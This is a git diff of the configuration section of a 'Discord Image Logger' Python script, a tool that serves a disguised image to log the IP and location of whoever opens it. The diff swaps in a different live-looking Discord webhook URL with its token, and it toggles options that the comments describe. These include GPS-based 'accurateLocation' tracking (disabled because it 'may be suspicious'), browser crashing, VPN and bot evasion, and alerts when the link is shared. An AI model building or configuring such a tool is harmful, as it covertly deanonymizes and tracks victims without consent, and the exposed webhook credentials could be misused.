@@ -1,6 +1,5 @@
-
 # Discord Image Logger
-# By KUPAL
+# By STAN
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -13,23 +12,24 @@ __author__ = "XSYTHO"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1369282563784441856/h3tUAuOYn4x-WES3kCas5x5I8nw2KNhUsERenma0W22zckPVbsqbtu6Ozjy49J24ZUQz",
-    "image": "https://media.discordapp.net/attachments/1369281337386733599/1369281371553398804/CQ21Exo8g423wwZaH1tqHMJaHhBGBwbjfJwfqmKwZD1z44Nf8gfwSZGV823Nx1BSl2A.png?ex=681b4a26&is=6819f8a6&hm=083f0db02194f2414db2e16efd7aa2733435e95b12f940d188819a6b6f56d827&=&format=webp&quality=lossless&width=410&height=410", 
-                                              
-    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
+    "webhook": "https://discord.com/api/webhooks/1357230392507240469/4XskV-5LnfH478Iu7i4U8Egvig150SZ-wX0CtGk1PdqJhkxlFD4pFYgyZWSPrVzo-7YX",
+    "image": "c:\Users\Dawggydawg\Pictures\70ce41310f8a9c2a84e97b57198015d9.gif", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "STAN", 
-    "color": 0xFF0000,
+    "username": "STAN", # Set this to the name you want the webhook to have
+    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, 
+    "crashBrowser": False, 
     
-    "accurateLocation": True, 
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": ""
+        "message": "This browser has been KUPAL", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
@@ -37,7 +37,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://www.youtube.com/watch?v=zgpK5eeZ4Jg" # Link to the webpage to redirect to 
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
